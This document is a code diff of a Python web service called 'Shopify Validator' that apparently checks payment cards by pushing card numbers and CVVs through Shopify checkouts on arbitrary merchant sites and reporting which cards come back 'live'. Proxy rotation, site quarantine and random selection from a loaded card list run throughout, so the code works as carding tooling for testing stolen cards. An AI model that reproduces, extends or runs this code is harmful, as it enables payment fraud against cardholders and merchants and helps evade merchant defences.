-                                if d_selected.get("handle"):
-                                    delivery_strategy = d_selected["handle"]
-                                elif d_strategies:
-                                    delivery_strategy = d_strategies[0].get(
-                                        "handle", delivery_strategy
-                                    )
-                                if d_strategies:
-                                    d_ship_amt = d_strategies[0].get("amount") or {}
-                                    try:
-                                        shipping_amount = float(
-                                            d_ship_amt.get("value", {}).get("amount") or
-                                            d_ship_amt.get("amount") or "0"
-                                        )
-                                    except (ValueError, TypeError):
-                                        pass
-                        d_tax = d_seller.get("tax") or {}
-                        if d_tax.get("__typename") == "FilledTaxTerms":
-                            d_tax_amt = d_tax.get("totalTaxAmount") or {}
-                            try:
-                                tax_amount = float(
-                                    d_tax_amt.get("value", {}).get("amount") or
-                                    d_tax_amt.get("amount") or "0"
-                                )
-                            except (ValueError, TypeError):
-                                pass
-                except Exception as ex:
-                    if _looks_like_proxy_error(str(ex)):
-                        return _r("PROXY_ERROR", message=str(ex)[:120],
-                                  proxy_dead=True, is_site_error=True)
-                    log.warning("delivery proposal failed for %s: %s", hostname, ex)
-
             if not delivery_strategy:
                 return _r("NO_SELLER_PROPOSAL",
                           message="No delivery strategy from proposal",
@@ -1775,6 +1560,7 @@ async def validate_card(
                                   "(card not tested)",
                           is_site_error=False)
 
+            # ─── Vault tokenization (single URL — legacy deposit.shopifyinc.com removed) ───
             vault_payload = {
                 "credit_card": {
                     "number": cc, "month": int(month),
@@ -1799,26 +1585,17 @@ async def validate_card(
                 vault_headers["shopify-identification-signature"] = ident_sig
 
             token = None
-            # PERF: only retry second vault on HTTP 404 (endpoint moved).
-            # Timeouts / 5xx mean vault unhealthy — fallback won't help,
-            # wasted 300-800ms per card. Break out immediately.
-            for vault_url in [
-                "https://checkout.pci.shopifyinc.com/sessions",
-                "https://deposit.shopifyinc.com/sessions",
-            ]:
-                try:
-                    vr = await session.post(vault_url, json=vault_payload,
-                                            headers=vault_headers)
-                    if vr.status_code == 404:
-                        continue
-                    vd = orjson.loads(vr.content)
-                    token = vd.get("id")
-                    break
-                except Exception as ex:
-                    if _looks_like_proxy_error(str(ex)):
-                        return _r("PROXY_ERROR", message=str(ex)[:120],
-                                  proxy_dead=True, is_site_error=True)
-                    break
+            try:
+                vr = await session.post(
+                    "https://checkout.pci.shopifyinc.com/sessions",
+                    json=vault_payload, headers=vault_headers,
+                )
+                vd = orjson.loads(vr.content)
+                token = vd.get("id")
+            except Exception as ex:
+                if _looks_like_proxy_error(str(ex)):
+                    return _r("PROXY_ERROR", message=str(ex)[:120],
+                              proxy_dead=True, is_site_error=True)
 
             if not token:
                 return _r("TOKENIZATION_FAILED",
@@ -1833,17 +1610,36 @@ async def validate_card(
             }}
 
             def _build_submit_body() -> dict:
-                submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
-                submit_deliv_line["selectedDeliveryStrategy"] = {
-                    "deliveryStrategyByHandle": {
-                        "handle": delivery_strategy, "customDeliveryRate": False
+                submit_deliv_line = {
+                    "destination": {"streetAddress": {
+                        "address1": street, "address2": "", "city": city,
+                        "countryCode": country_code, "postalCode": s_zip,
+                        "firstName": first, "lastName": last,
+                        "zoneCode": state, "phone": phone,
+                    }},
+                    "selectedDeliveryStrategy": {
+                        "deliveryStrategyByHandle": {
+                            "handle": delivery_strategy, "customDeliveryRate": False
+                        },
+                        "options": {"phone": phone},
                     },
-                    "options": {"phone": phone},
+                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
+                    "expectedTotalPrice": {"any": True},
+                    "destinationChanged": False,
                 }
-                submit_deliv_line["expectedTotalPrice"] = {"any": True}
-                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
-                for ml in submit_merch.get("merchandiseLines", []):
-                    ml["expectedTotalPrice"] = {"any": True}
+                submit_merch = {
+                    "merchandiseLines": [{
+                        "stableId": stable_id,
+                        "merchandise": {"productVariantReference": {
+                            "id": merch_id_full, "variantId": variant_id_full,
+                            "properties": [], "sellingPlanId": None,
+                            "sellingPlanDigest": None,
+                        }},
+                        "quantity": {"items": {"value": 1}},
+                        "expectedTotalPrice": {"any": True},
+                        "lineComponentsSource": None, "lineComponents": [],
+                    }]
+                }
                 return {
                     "query": MUTATION_SUBMIT,
                     "variables": {
@@ -1874,7 +1670,7 @@ async def validate_card(
                                 }],
                                 "billingAddress": billing_addr,
                             },
-                            "buyerIdentity": copy.deepcopy(deliv_vars["buyerIdentity"]),
+                            "buyerIdentity": copy.deepcopy(ship_vars["buyerIdentity"]),
                             "taxes": {
                                 "proposedAllocations": None,
                                 "proposedTotalAmount": {"any": True},
@@ -1986,9 +1782,8 @@ async def validate_card(
                         "variables": {"receiptId": rid, "sessionToken": sst},
                         "operationName": "PollForReceipt",
                     }
-                    # PERF: 4.5s total budget (was 6.5s). Front-loaded polls
-                    # catch fast receipts earlier.
-                    for _poll_idx, _poll_delay in enumerate((0.3, 0.6, 0.9, 1.2, 1.5)):
+                    # PERF: 3.3s budget total (was 4.5s) — most receipts in <1s
+                    for _poll_delay in (0.2, 0.4, 0.6, 0.9, 1.2):
                         await asyncio.sleep(_poll_delay)
                         try:
                             pr = await session.post(
@@ -2099,207 +1894,10 @@ async def validate_card(
             await _close_session(session)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# AUTO-VALIDATE
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def _site_error_result(message: str, last_result: Optional[dict] = None,
-                       exhausted: bool = False, pool_size: int = 0) -> dict:
-    code = "SITES_EXHAUSTED" if exhausted else "SITE_ERROR"
-    base = dict(last_result or {})
-    base.update({
-        "Response":     code,
-        "Message":      message,
-        "code":         code,
-        "decline_code": code,
-        "Status":       False,
-        "Gateway":      base.get("Gateway", "Shopify Payments"),
-        "Price":        base.get("Price", "0.00"),
-        "Proxy":        base.get("Proxy", "Live"),
-        "Time":         base.get("Time", "0s"),
-        "Retry":        not exhausted,
-        "SkipSite":     exhausted,
-        "PoolSize":     pool_size,
-    })
-    if "Site" not in base:
-        base["Site"] = ""
-    if "CC" not in base:
-        base["CC"] = ""
-    return base
-
-async def _auto_validate(
-    cc: str, month: str, year: str, cvv: str,
-    proxy_str: Optional[str] = None,
-    max_price: Optional[float] = None,
-    max_attempts: int = AUTO_ATTEMPTS,
-    exclude: Optional[list[str]] = None,
-    pool: Optional[list[str]] = None,
-) -> dict:
-    exclude_set = set(exclude or [])
-    _stats["auto_total_cards"] += 1
-
-    if not pool:
-        return _site_error_result(
-            "No sites supplied — client must pass `fallback_sites`",
-            exhausted=False, pool_size=0,
-        )
-
-    pool = list(dict.fromkeys(pool))
-
-    usable: list[str] = []
-    hard_dead_count = 0
-    for s in pool:
-        if s in exclude_set:
-            continue
-        host = urlparse(s).netloc
-        if _is_hard_dead(host):
-            hard_dead_count += 1
-            continue
-        if _site_usable(host)[0]:
-            usable.append(s)
-
-    if not usable:
-        return _site_error_result(
-            f"All {len(pool)} pool sites hard-dead/quarantined "
-            f"(hard_dead={hard_dead_count})",
-            exhausted=True, pool_size=len(pool),
-        )
-
-    random.shuffle(usable)
-    candidates = usable[:max_attempts]
-
-    last_result: Optional[dict] = None
-    transient_failures: list[tuple[str, str]] = []
-
-    BATCH = max(1, AUTO_BATCH_SIZE)
-    for i in range(0, len(candidates), BATCH):
-        if proxy_str and not _proxy_usable(proxy_str)[0]:
-            return _site_error_result(
-                "Proxy went dead mid-auto (see /proxy-health)",
-                last_result, exhausted=True, pool_size=len(pool),
-            )
-
-        batch = candidates[i:i + BATCH]
-        tasks = [
-            asyncio.create_task(validate_card(
-                cc, month, year, cvv, s,
-                proxy_str=proxy_str, max_price=max_price,
-            ))
-            for s in batch
-        ]
-        stop_early = False
-        try:
-            for fut in asyncio.as_completed(tasks):
-                try:
-                    result = await fut
-                except asyncio.CancelledError:
-                    continue
-                except Exception as ex:
-                    log.warning("[auto] task exception: %s", ex)
-                    continue
-
-                last_result = result
-                _stats["auto_total_attempts"] += 1
-
-                host = urlparse(result.get("Site") or "").netloc
-                code = str(result.get("Response", "")).upper()
-
-                if code not in HARD_DEAD_CODES and code not in PROXY_STOP_CODES:
-                    _record_site_result(host, code)
-
-                if code in FINAL_CODES:
-                    log.info("[auto] SUCCESS on %s: %s", host, code)
-                    stop_early = True
-                    break
-
-                if code in PROXY_STOP_CODES:
-                    stop_early = True
-                    break
-
-                if code in TRANSIENT_CODES:
-                    transient_failures.append((result.get("Site") or "", code))
-        finally:
-            for t in tasks:
-                if not t.done():
-                    t.cancel()
-            await asyncio.gather(*tasks, return_exceptions=True)
-
-        if stop_early:
-            return last_result  # type: ignore[return-value]
-
-    if transient_failures:
-        for delay in (2.0, 6.0, 15.0):
-            if not transient_failures:
-                break
-            await asyncio.sleep(delay)
-            still: list[tuple[str, str]] = []
-            for site, _ in list(transient_failures):
-                if _is_hard_dead(urlparse(site).netloc):
-                    continue
-                _stats["auto_total_attempts"] += 1
-                result = await validate_card(cc, month, year, cvv, site,
-                                             proxy_str=proxy_str,
-                                             max_price=max_price)
-                last_result = result
-                code = str(result.get("Response", "")).upper()
-                if code in FINAL_CODES or code in PROXY_STOP_CODES:
-                    log.info("[auto] SUCCESS on retry: %s", code)
-                    return result
-                if code in TRANSIENT_CODES:
-                    still.append((site, code))
-            transient_failures = still
-
-    return _site_error_result(
-        f"All {len(candidates)} sites exhausted (pool_size={len(pool)})",
-        last_result, exhausted=True, pool_size=len(pool),
-    )
-
-async def validate_card_raced(
-    cc: str, month: str, year: str, cvv: str, sites: list[str],
-    proxy_str: Optional[str] = None,
-    max_price: Optional[float] = None,
-    race_count: int = RACE_COUNT,
-) -> dict:
-    if not sites:
-        return _site_error_result("No sites provided")
-    live_sites = [s for s in sites if _site_usable(urlparse(s).netloc)[0]]
-    pool = live_sites if live_sites else list(sites)
-    random.shuffle(pool)
-    picked = pool[: max(1, race_count)]
-    tasks = [
-        asyncio.create_task(
-            validate_card(cc, month, year, cvv, s,
-                          proxy_str=proxy_str, max_price=max_price)
-        )
-        for s in picked
-    ]
-    last_result: Optional[dict] = None
-    try:
-        for coro in asyncio.as_completed(tasks):
-            try:
-                res = await coro
-            except asyncio.CancelledError:
-                continue
-            except Exception:
-                continue
-            last_result = res
-            code = str(res.get("Response", "")).upper()
-            if code not in SITE_ERROR_CODES:
-                for t in tasks:
-                    if not t.done():
-                        t.cancel()
-                return res
-        return last_result or _site_error_result("All raced sites failed")
-    finally:
-        for t in tasks:
-            if not t.done():
-                t.cancel()
-        await asyncio.gather(*tasks, return_exceptions=True)
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # FASTAPI APP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-app = FastAPI(title="Shopify Validator", version="4.5.3")
+app = FastAPI(title="Shopify Validator", version="4.6.0")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -2307,6 +1905,22 @@ app.add_middleware(
     allow_methods=["*"],
     allow_headers=["*"],
 )
+
+@app.on_event("startup")
+async def _startup_shared():
+    if _shared:
+        try:
+            await _shared.start()
+        except Exception as e:
+            log.warning("shared_state start failed: %s", e)
+
+@app.on_event("shutdown")
+async def _shutdown_shared():
+    if _shared:
+        try:
+            await _shared.stop()
+        except Exception:
+            pass
 
 def _resolve_proxy_param(proxy: Optional[str], proxies: Optional[str]) -> tuple[Optional[str], list[str]]:
     param = proxies or proxy
@@ -2340,6 +1954,7 @@ async def shopify_route(
     auto:           Optional[bool]  = Query(None),
     validate_only:  Optional[bool]  = Query(None),
 ):
+    """Single-site validation. Fallback fanout removed — bot handles rotation."""
     if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
         return JSONResponse(
             {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
@@ -2359,113 +1974,31 @@ async def shopify_route(
     if rejected and not chosen_proxy:
         return _proxy_rejection_response(rejected)
 
-    n_attempts = attempts if attempts and attempts > 0 else AUTO_ATTEMPTS
-
-    request_pool: list[str] = _parse_sites_param(fallback_sites)
     site_norm = _normalize_site(site) if site else None
-    if site_norm and site_norm not in request_pool:
-        request_pool.insert(0, site_norm)
+    if not site_norm:
+        return JSONResponse({
+            "error":      "`site` parameter required (auto mode removed in v4.6.0)",
+            "Response":   "NO_SITES",
+            "Message":    "Client must pass a single site; bot handles rotation",
+            "Status":     False,
+            "Retry":      False,
+            "SkipSite":   True,
+            "Proxy":      "Live",
+            "Gateway":    "Shopify Payments",
+            "Price":      "0.00",
+            "Time":       "0s",
+        }, status_code=400)
 
-    single_site_mode = (site_norm is not None and auto is not True)
-
-    if auto is True or not site:
-        if not request_pool:
-            return JSONResponse({
-                "error":      "auto mode requires the `fallback_sites` parameter",
-                "Response":   "NO_SITES",
-                "Message":    "API is stateless — client must supply its site list",
-                "Status":     False,
-                "Retry":      False,
-                "SkipSite":   True,
-                "Proxy":      "Live",
-                "Gateway":    "Shopify Payments",
-                "Price":      "0.00",
-                "Time":       "0s",
-            }, status_code=400)
-
-        result = await _auto_validate(
-            card["cc"], card["month"], card["year"], card["cvv"],
-            proxy_str=chosen_proxy, max_price=max_price, max_attempts=n_attempts,
-            pool=request_pool,
-        )
-        _stats[f"auto_response_{result.get('Response', 'UNKNOWN')}"] += 1
-        return JSONResponse(result)
-
-    primary = await validate_card(
+    result = await validate_card(
         card["cc"], card["month"], card["year"], card["cvv"],
         site_norm, proxy_str=chosen_proxy, max_price=max_price,
         validate_only=bool(validate_only),
     )
-    primary_host = urlparse(primary.get("Site") or site_norm).netloc
-    primary_code = str(primary.get("Response", "")).upper()
-    if primary_code not in PROXY_STOP_CODES:
-        _record_site_result(primary_host, primary_code)
-
-    if primary_code in FINAL_CODES or primary_code in PROXY_STOP_CODES:
-        _stats[f"response_{primary_code}"] += 1
-        return JSONResponse(primary)
-
-    if single_site_mode:
-        primary["Retry"] = primary_code in TRANSIENT_CODES
-        _stats[f"response_{primary_code}"] += 1
-        return JSONResponse(primary)
-
-    if len(request_pool) <= 1:
-        primary["Retry"] = True
-        return JSONResponse(primary)
-
-    result = await _auto_validate(
-        card["cc"], card["month"], card["year"], card["cvv"],
-        proxy_str=chosen_proxy, max_price=max_price, max_attempts=n_attempts,
-        exclude=[site_norm], pool=request_pool,
-    )
-    _stats[f"auto_response_{result.get('Response', 'UNKNOWN')}"] += 1
-    return JSONResponse(result)
-
-@app.get("/shopify-race")
-async def shopify_race_route(
-    sites:     str            = Query(...),
-    cc:        Optional[str]  = Query(None),
-    proxy:     Optional[str]  = Query(None),
-    proxies:   Optional[str]  = Query(None),
-    max_price: Optional[float] = Query(None),
-    race:      Optional[int]  = Query(None),
-    key:       Optional[str]  = Query(None),
-):
-    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
-        return JSONResponse(
-            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
-            status_code=401)
-
-    site_list = _parse_sites_param(sites)
-    if not site_list:
-        return JSONResponse({"error": "No valid sites"}, status_code=400)
-
-    if cc:
-        card = _parse_card(cc)
-        if not card:
-            return JSONResponse({"error": "Bad card format."}, status_code=400)
-    else:
-        cards = _get_cards()
-        if not cards:
-            return JSONResponse({"error": "No cards available."}, status_code=400)
-        card = random.choice(cards)
-
-    chosen_proxy, rejected = _resolve_proxy_param(proxy, proxies)
-    if rejected and not chosen_proxy:
-        return _proxy_rejection_response(rejected)
-
-    race_n = race if race and race > 0 else RACE_COUNT
-    result = await validate_card_raced(
-        card["cc"], card["month"], card["year"], card["cvv"],
-        site_list, proxy_str=chosen_proxy, max_price=max_price, race_count=race_n,
-    )
-    answered_site = result.get("Site", "")
-    if answered_site:
-        resp_code = result.get("Response", "UNKNOWN")
-        if resp_code not in PROXY_STOP_CODES:
-            _record_site_result(urlparse(answered_site).netloc, resp_code)
-    _stats[f"race_response_{result.get('Response', 'UNKNOWN')}"] += 1
+    host = urlparse(result.get("Site") or site_norm).netloc
+    code = str(result.get("Response", "")).upper()
+    if code not in PROXY_STOP_CODES:
+        _record_site_result(host, code)
+    result["Retry"] = code in TRANSIENT_CODES
     return JSONResponse(result)
 
 @app.get("/check")
@@ -2481,8 +2014,6 @@ async def check_route(
         return JSONResponse(
             {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
             status_code=401)
-    if not site:
-        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)
 
     if card:
         parsed = _parse_card(card)
@@ -2505,7 +2036,6 @@ async def check_route(
     response_code = result.get("Response", "")
     if response_code not in PROXY_STOP_CODES:
         _record_site_result(urlparse(ourl).netloc, response_code)
-    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
     return JSONResponse({
         "valid":         response_code in LIVE_RESPONSES,
         "site":          site,
@@ -2519,153 +2049,15 @@ async def check_route(
         "proxy_used":    result.get("ProxyUsed", "direct"),
     })
 
-@app.get("/proxy-check")
-async def proxy_check_route(
-    proxy: str = Query(..., description="Proxy URL to test"),
-    key: Optional[str] = Query(None),
-):
-    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
-        return JSONResponse(
-            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
-            status_code=401)
-
-    ok, ip, latency, err = await _probe_proxy(proxy)
-    if ok:
-        _mark_proxy_alive(proxy)
-    else:
-        _mark_proxy_dead(proxy, f"probe: {err or 'failed'}")
-    entry = _PROXY_HEALTH.get(proxy, {})
-    return JSONResponse({
-        "proxy":         _mask_proxy(proxy),
-        "healthy":       ok,
-        "ip":            ip,
-        "latency_ms":    latency,
-        "error":         err,
-        "fail_count":    entry.get("fail_count", 0),
-        "success_count": entry.get("success_count", 0),
-        "cooldown_sec":  max(0, int(entry.get("dead_until", 0) - time.time())),
-    })
-
-@app.get("/proxy-health")
-async def proxy_health_route(key: Optional[str] = Query(None)):
-    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
-        return JSONResponse(
-            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
-            status_code=401)
-    now = time.time()
-    out = {}
-    for proxy, e in _PROXY_HEALTH.items():
-        out[_proxy_id(proxy)] = {
-            "masked":              _mask_proxy(proxy),
-            "alive":               now >= e.get("dead_until", 0),
-            "cooldown_remaining":  max(0, int(e.get("dead_until", 0) - now)),
-            "fail_count":          e.get("fail_count", 0),
-            "success_count":       e.get("success_count", 0),
-            "last_error":          e.get("last_error", "")[:100],
-            "probe_inflight":      proxy in _PROXY_PROBE_INFLIGHT,
-        }
-    return JSONResponse({
-        "count": len(out),
-        "config": {
-            "cooldown_base_sec": PROXY_COOLDOWN_BASE,
-            "cooldown_max_sec":  PROXY_COOLDOWN_MAX,
-            "probe_url":         PROXY_ACTIVE_CHECK_URL,
-        },
-        "proxies": out,
-    })
-
-@app.post("/proxy-clear")
-async def proxy_clear_route(key: Optional[str] = Query(None)):
-    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
-        return JSONResponse(
-            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
-            status_code=401)
-    n = len(_PROXY_HEALTH)
-    _PROXY_HEALTH.clear()
-    _PROXY_PROBE_INFLIGHT.clear()
-    return JSONResponse({"cleared": n})
-
-@app.get("/healthy-sites")
-async def healthy_sites_route(
-    sites: str = Query(..., description="Comma-separated list of sites to filter"),
-):
-    pool = _parse_sites_param(sites)
-    out: list[str] = []
-    seen: set[str] = set()
-    for site in pool:
-        host = urlparse(site).netloc
-        if host in seen:
-            continue
-        seen.add(host)
-        if _site_usable(host)[0]:
-            out.append(site)
-    return JSONResponse({
-        "count":        len(out),
-        "sites":        out,
-        "total_input":  len(pool),
-        "generated_at": int(time.time()),
-    })
-
-@app.get("/site-stats")
-async def site_stats_route():
-    now = time.time()
-    out = {}
-    for host, s in _site_stats.items():
-        outcomes = list(s.get("outcomes", []))
-        total = len(outcomes)
-        errs = sum(outcomes) if outcomes else 0
-        success_rate = (1 - errs / total) * 100 if total else None
-        blacklisted = now < s.get("blacklisted_until", 0)
-        throttled_until = _site_throttle.get(host, 0)
-        throttled = now < throttled_until
-        out[host] = {
-            "samples":              total,
-            "success_rate":         f"{success_rate:.1f}%" if success_rate is not None else "N/A",
-            "site_errors":          errs,
-            "success_count":        s.get("success_count", 0),
-            "error_count":          s.get("error_count", 0),
-            "last_response":        s.get("last_response", ""),
-            "blacklisted":          blacklisted,
-            "blacklist_remaining":  max(0, int(s.get("blacklisted_until", 0) - now)),
-            "throttled":            throttled,
-            "throttle_remaining":   max(0, int(throttled_until - now)),
-            "hard_dead":            _is_hard_dead(host),
-            "self_cooled":          _host_cooldown_active(host),
-            "live":                 not (blacklisted or throttled
-                                        or _is_hard_dead(host)
-                                        or _host_cooldown_active(host)),
-        }
-    return JSONResponse(out)
-
-@app.get("/quarantine")
-async def quarantine_route():
-    now = time.time()
-    out = {}
-    for host, s in _site_stats.items():
-        if now < s.get("blacklisted_until", 0):
-            out[host] = {
-                "reason":  "blacklisted",
-                "until":   int(s.get("blacklisted_until", 0)),
-                "samples": len(s.get("outcomes", [])),
-            }
-    for host, until in _site_throttle.items():
-        if now < until:
-            out.setdefault(host, {"reason": "throttled", "until": int(until)})
-    for host, until in _HOST_COOLDOWN.items():
-        if now < until:
-            out.setdefault(host, {"reason": "self-cooled", "until": int(until)})
-    return JSONResponse(out)
-
-@app.post("/skip-site")
-async def skip_site_route(site: str = Query(...)):
-    host = urlparse(_normalize_site(site)).netloc
-    _site_stats[host]["blacklisted_until"] = time.time() + BLACKLIST_SECONDS
-    return JSONResponse({"skipped": host,
-                         "until":   int(time.time() + BLACKLIST_SECONDS)})
-
 @app.get("/dead-sites")
 async def dead_sites_route():
     now = time.time()
+    # Cluster-wide view if shared state enabled
+    if _shared and _shared.enabled:
+        try:
+            await _shared.refresh()
+        except Exception:
+            pass
     out = {}
     for host, exp in list(_HARD_DEAD_CACHE.items()):
         if now >= exp:
@@ -2678,80 +2070,22 @@ async def dead_sites_route():
     return JSONResponse({
         "count": len(out),
         "sites": out,
-        "instruction": (
-            "Permanently prune these hosts from sites.txt or MongoDB "
-            "global_sites collection."
-        ),
+        "instruction": "Prune these hosts from sites.txt or MongoDB global_sites.",
     })
 
 @app.post("/dead-sites/clear")
 async def dead_sites_clear_route():
     n = len(_HARD_DEAD_CACHE)
     _HARD_DEAD_CACHE.clear()
+    if _shared and _shared.enabled:
+        try:
+            keys = [k async for k in _shared._client.scan_iter(match="hd:*", count=500)]
+            if keys:
+                await _shared._client.delete(*keys)
+            _shared._hard_dead.clear()
+        except Exception as e:
+            log.warning("Redis clear failed: %s", e)
     return JSONResponse({"cleared": n})
-
-@app.get("/host-throttle")
-async def host_throttle_route():
-    now = time.time()
-    out = {}
-    for host, until in list(_HOST_COOLDOWN.items()):
-        if now < until:
-            out[host] = {
-                "cooldown_remaining_sec": int(until - now),
-                "hits_last_window": len(_HOST_HITS.get(host, [])),
-            }
-    return JSONResponse({
-        "count": len(out),
-        "sites": out,
-        "config": {
-            "rate_limit": _HOST_RATE_LIMIT,
-            "rate_window_sec": _HOST_RATE_WINDOW,
-            "cooldown_sec": _HOST_COOLDOWN_SEC,
-        },
-    })
-
-@app.post("/host-throttle/clear")
-async def host_throttle_clear_route():
-    n = len(_HOST_COOLDOWN)
-    _HOST_COOLDOWN.clear()
-    for d in _HOST_HITS.values():
-        d.clear()
-    return JSONResponse({"cleared": n})
-
-@app.get("/pool-diagnose")
-async def pool_diagnose_route(
-    sites: str = Query(..., description="Comma-separated site list"),
-):
-    pool = _parse_sites_param(sites)
-    now = time.time()
-    buckets: dict[str, list[str]] = {
-        "live":        [],
-        "hard_dead":   [],
-        "blacklisted": [],
-        "throttled":   [],
-        "self_cooled": [],
-        "unknown":     [],
-    }
-    for s in pool:
-        h = urlparse(s).netloc
-        if _is_hard_dead(h):
-            buckets["hard_dead"].append(h)
-        elif _is_blacklisted(h):
-            buckets["blacklisted"].append(h)
-        elif _is_throttled(h):
-            buckets["throttled"].append(h)
-        elif _host_cooldown_active(h):
-            buckets["self_cooled"].append(h)
-        elif h not in _site_stats:
-            buckets["unknown"].append(h)
-        else:
-            buckets["live"].append(h)
-    return JSONResponse({
-        "total":  len(pool),
-        "counts": {k: len(v) for k, v in buckets.items()},
-        "buckets": buckets,
-        "generated_at": int(now),
-    })
 
 @app.get("/health")
 async def health_route():
@@ -2759,66 +2093,27 @@ async def health_route():
     now = time.time()
     return JSONResponse({
         "status":             "ok",
-        "version":            "4.5.3",
-        "mode":               "stateless",
-        "session_pool":       "disabled (fresh per card)",
-        "skip_delivery_proposal": SKIP_DELIVERY_PROPOSAL,
+        "version":            "4.6.0",
+        "mode":               "stateless-single-site",
+        "shared_state":       (_shared.stats() if _shared else {"enabled": False}),
         "cards_loaded":       len(cards),
         "site_concurrency":   SITE_CONCURRENCY,
         "cache_ttl":          CACHE_TTL,
         "variant_ttl":        VARIANT_TTL,
-        "fail_cache_ttl":     FAIL_CACHE_TTL,
-        "throttle_cooldown":  THROTTLE_COOLDOWN,
         "request_timeout":    REQUEST_TIMEOUT,
         "max_price":          MAX_PRICE,
-        "min_amount":         MIN_AMOUNT,
         "hard_max_price":     HARD_MAX_PRICE,
-        "auto_attempts":      AUTO_ATTEMPTS,
-        "auto_batch_size":    AUTO_BATCH_SIZE,
         "blacklist_threshold": BLACKLIST_THRESHOLD,
         "blacklist_samples":   BLACKLIST_SAMPLES,
         "blacklist_seconds":   BLACKLIST_SECONDS,
-        "hard_dead_ttl_permanent": _HARD_DEAD_TTL_PERMANENT,
-        "hard_dead_ttl_probable":  _HARD_DEAD_TTL_PROBABLE,
         "host_rate_limit":    _HOST_RATE_LIMIT,
-        "host_rate_window":   _HOST_RATE_WINDOW,
         "host_cooldown_sec":  _HOST_COOLDOWN_SEC,
-        "proxy_cooldown_base": PROXY_COOLDOWN_BASE,
-        "proxy_cooldown_max":  PROXY_COOLDOWN_MAX,
-        "proxy_probe_url":     PROXY_ACTIVE_CHECK_URL,
-        "impersonate":        IMPERSONATE,
-        "keys_configured":    len(VALID_API_KEYS),
         "cached_products":    len(_product_cache),
         "cached_variants":    len(_variant_cache),
-        "blacklisted_sites":  sum(1 for s in _site_stats.values()
-                                  if now < s.get("blacklisted_until", 0)),
-        "throttled_sites":    sum(1 for t in _site_throttle.values() if now < t),
         "hard_dead_cached":   sum(1 for exp in _HARD_DEAD_CACHE.values() if now < exp),
-        "self_throttled":     sum(1 for until in _HOST_COOLDOWN.values() if now < until),
-        "proxies_tracked":    len(_PROXY_HEALTH),
-        "proxies_dead":       sum(1 for e in _PROXY_HEALTH.values()
-                                  if now < e.get("dead_until", 0)),
-        "proxies_probing":    len(_PROXY_PROBE_INFLIGHT),
+        "self_throttled":     sum(1 for u in _HOST_COOLDOWN.values() if now < u),
+        "proxies_dead":       sum(1 for u in _PROXY_DEAD_UNTIL.values() if now < u),
     })
-
-@app.get("/stats")
-async def stats_route():
-    return JSONResponse(dict(_stats))
-
-@app.post("/cache/clear")
-async def cache_clear_route():
-    pc, vc = len(_product_cache), len(_variant_cache)
-    _product_cache.clear()
-    _variant_cache.clear()
-    return JSONResponse({"cleared_products": pc, "cleared_variants": vc})
-
-@app.post("/site-stats/clear")
-async def site_stats_clear_route():
-    n1 = len(_site_stats)
-    n2 = len(_site_throttle)
-    _site_stats.clear()
-    _site_throttle.clear()
-    return JSONResponse({"cleared_stats": n1, "cleared_throttles": n2})
 
 @app.post("/reload")
 async def reload_route():
